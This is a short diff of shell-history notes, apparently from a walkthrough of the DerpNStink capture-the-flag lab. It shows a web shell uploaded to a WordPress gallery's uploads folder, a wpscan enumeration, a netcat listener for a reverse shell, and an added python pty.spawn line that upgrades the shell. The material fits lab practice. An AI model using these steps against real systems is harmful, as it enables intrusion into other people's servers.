@@ -35,6 +35,8 @@ http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php
    12  sudo nano /etc/host
    13  cat /etc/hosts
    14  sudo nano /etc/hosts
+
+python -c 'import pty; pty.spawn("/bin/bash")'
    15  wpscan --url http://derpnstink.local/weblog -e
    16  nano shell.php
    17  ^[[200~nc -lvnp 4444 
